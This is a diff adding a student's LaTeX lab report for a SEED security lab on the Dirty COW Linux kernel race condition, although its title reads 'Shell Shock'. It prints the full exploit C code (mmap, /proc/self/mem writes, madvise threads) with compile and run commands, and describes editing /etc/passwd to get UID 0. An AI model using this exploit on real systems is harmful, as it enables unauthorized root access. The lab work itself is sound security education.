@@ -1,0 +1,208 @@
+\documentclass[14pt]{extarticle}
+
+\usepackage{enumitem}
+\usepackage{calc}
+\usepackage{tikz}
+\usepackage{wrapfig}
+\usepackage{graphicx}
+\graphicspath{ {./images/} }
+\usepackage{listings}
+\usepackage{color}
+\usepackage{textcomp}
+\definecolor{listinggray}{gray}{0.9}
+\definecolor{lbcolor}{rgb}{0.9,0.9,0.9}
+\lstset{
+	backgroundcolor=\color{lbcolor},
+	tabsize=4,
+	rulecolor=,
+	language=bash,
+  basicstyle=\scriptsize,
+  upquote=true,
+  aboveskip={1.5\baselineskip},
+  columns=fixed,
+	morekeywords={gcc, gdb, sudo, rm, chmod, chown, ln, ls, s, w, ln, vim, hexdump, z, o, while, do, done, echo},
+  showstringspaces=false,
+  extendedchars=true,
+  breaklines=true,
+  prebreak = \raisebox{0ex}[0ex][0ex]{\ensuremath{\hookleftarrow}},
+  frame=single,
+  showtabs=false,
+  showspaces=false,
+  showstringspaces=false,
+  identifierstyle=\ttfamily,
+  keywordstyle=\color[rgb]{0,0,1},
+  commentstyle=\itshape\color{purple!40!black},
+  stringstyle=\color[rgb]{0.627,0.126,0.941},
+}
+\lstdefinestyle{customc}{
+  belowcaptionskip=1\baselineskip,
+  breaklines=true,
+  frame=L,
+  xleftmargin=\parindent,
+  language=C,
+  showstringspaces=false,
+  basicstyle=\footnotesize\ttfamily,
+  keywordstyle=\bfseries\color{green!40!black},
+  commentstyle=\itshape\color{purple!40!black},
+  identifierstyle=\color{blue},
+  stringstyle=\color{orange},
+}
+\lstdefinelanguage{sh}{
+morekeywords={gcc, gdb, sudo, rm, chmod, chown, ln, ls, s, w, ln, vim, hexdump, z, o, while, do, done, echo},
+sensitive=false
+}
+\newcommand{\inlinecode}[2]{\colorbox{lightgray}{\lstinline[language=#1]$#2$}}
+
+\usetikzlibrary{trees}
+\parskip=.9ex
+\textwidth=7.0in
+\textheight=9.0in
+\oddsidemargin=-.25in
+\topmargin=-.75in
+
+\begin{document}
+
+\title{Shell Shock}
+
+\author{Zane Durkin\\
+    University of Idaho}
+\begin{description}[leftmargin=!, labelwidth=\widthof{\bfseries Author(s) Name(s)}]
+\item [Year and Semester] 2018 FALL
+\item [Course Number] CS-336
+\item [Course Title] Intro. to Information Assurance
+\item [Work Number] LA-05
+\item [Work Name] Dirty Cow
+\item [Work Version] Version 1
+\item [Long Date] Sunday, 2 December 2018
+\item [Author(s) Name(s)] Zane Durkin
+\end{description}
+\begin{abstract}
+In this article I will be explaining in detail the Tasks I preformed during the SEED security lab5.
+\end{abstract}
+
+\setcounter{section}{-1}
+\section{Lab environment}
+The Dirty cow attack is a vulnerability in the copy-on-write code in the linux kernel. This attack exploits the race condition that is created when a file that has read permissions, is copied to make a duplicate version for editing. The vulnerability allows the user to write to what is supposed to be a read only file.
+
+\section{Task 1: creating a vulnerable file}
+This task is to write to a read only file using the Dirty COW vulnerability.
+
+\subsection{Create a Dummy File}
+Since I won't want to corrupt any of my current files, I'll create a dummy file called zzz in the root directory. I'll make this file read only for normal users, and I'll fill it with some random content that I can edit later.
+I'll create the file using the following command
+\begin{lstlisting}[language=sh]
+sudo touch /zzz
+\end{lstlisting}
+And now I need to make it read only for normal users. I can do this with the following command\cite{seed-dirtycow}:
+\begin{lstlisting}[language=sh]
+sudo chmod 644 /zzz
+\end{lstlisting}
+Now to add some random text to the file
+\begin{lstlisting}[language=sh]
+sudo cat >> /zzz << EOF
+111222333
+EOF
+\end{lstlisting}
+Now that I have a read only file in the root folder, with some data in it, I can run my attack against this file to try and change it to replace the 2's with *'s.
+
+\subsection{setting up Memory Mapping Thread}
+I'll need to download the cow\_attack.c from the seed website. This program is not that complex and can be broken down into three threads: the Main thread, the write thread, and the madvise thread.
+The first thread opens the /zzz file and maps it to memory, and then it find where the 2's are in the text (or whatever pattern I choose to find). Once this is found, it spawns two new threads to start the race condition.
+
+This code is explained with comments here\cite{seed-dirtycow}:
+\begin{lstlisting}[language=sh]
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <sys/stat.h>
+#include <string.h>
+void *map;
+void *writeThread(void *arg);
+void *madviseThread(void *arg);
+int main(int argc, char *argv[])
+{
+  pthread_t pth1,pth2;
+  struct stat st;
+  int file_size;
+// Open the target file in the read-only mode.
+  int f=open("/zzz", O_RDONLY);
+// Map the file to COW memory using MAP_PRIVATE.
+  fstat(f, &st);
+  file_size = st.st_size;
+  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+// Find the position of the target area
+  char *position = strstr(map, "222");
+// We have to do the attack using two threads.
+  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size);
+  pthread_create(&pth2, NULL, writeThread, position);
+// Wait for the threads to finish.
+  pthread_join(pth1, NULL);
+  pthread_join(pth2, NULL);
+  return 0;
+}
+\end{lstlisting}
+
+\subsection{Setup the write thread}
+The writing thread will attempt to replace the 2's in the memory with *'s . Since the memory type is COW, this thread will not be able to modify the underlying file, and will only be able to make a copy of the mapped memory.\cite{seed-dirtycow}
+\begin{lstlisting}[language=sh]
+void *writeThread(void *arg)
+{
+	// The characters to replace place in the file
+  char *content= "***";
+	// the offset that the new text should go
+  off_t offset = (off_t) arg;
+	// opening the file for read write permissions
+  int f=open("/proc/self/mem", O_RDWR);
+  while(1) {
+    // Move the file pointer to the corresponding position.
+    lseek(f, offset, SEEK_SET);
+    // Write to the memory.
+    write(f, content, strlen(content));
+  }
+}
+\end{lstlisting}
+
+
+\subsection{Madvise Thread}
+The final thread is the madvise thread. This thread will only work on discarding the private copy of the mapped memory. This will cause the page table to point the memory back to the original file.\\
+This function will look like this\cite{seed-dirtycow}:
+\begin{lstlisting}[language=sh]
+void *madviseThread(void *arg)
+{
+  int file_size = (int) arg;
+  while(1){
+      madvise(map, file_size, MADV_DONTNEED);
+  }
+}
+\end{lstlisting}
+
+
+\subsection{Launch the attack}
+In order for the attack to work, the madvise system call  and the write system call need to be invoked in a way that creates a race condition. This is why they are split into their own threads. If they were called in the same thread, one call would always finish before the other, and thus it would ensure that there is always a secure mapping of the file before writing.\\
+To compile the code I'll run the following command
+\begin{lstlisting}[language=sh]
+gcc cow_attack.c -o cow_attack -lpthread
+\end{lstlisting}
+And I can run the attack using
+\begin{lstlisting}[language=sh]
+./cow_attack
+\end{lstlisting}
+
+I can leave this program running for a while to see if it is able to edit the /zzz file\cite{seed-dirtycow}.
+
+I left this program running for 3 minutes and I still could not change the /zzz file (the change was suppose to only take a few seconds). Perhaps this os is already patched?
+
+\section{Task 2: Modify the Password File to Gain the Root Privilege}
+Since I was unable to edit the Dummy file, I won't be able to edit the /etc/passwd file to give myself root access.
+If I did have the ability to edit the Dummy file, I would need to change my user Id in the passwd file to 0. The zero ID is used in linux to signify the root user\cite{seed-dirtycow}. Currently my ID is about 2000, which is just a number assigned when my user was created. But the root user will always be ID 0 since it is the user that has unrestricted access to the entire system. To use the dirty cow attack I would replace the 2's in the main function with my current ID. And then I would replace the *'s with the ID I wish to have (being the zero ID).
+
+
+\section{Fixing exploit}
+For systems that are vulnerable to this attack, I would suggest updating the operating system to get the latest patches.
+
+
+
+\newpage
+\bibliographystyle{ACM}
+\bibliography{../../citations}
+\end{document}
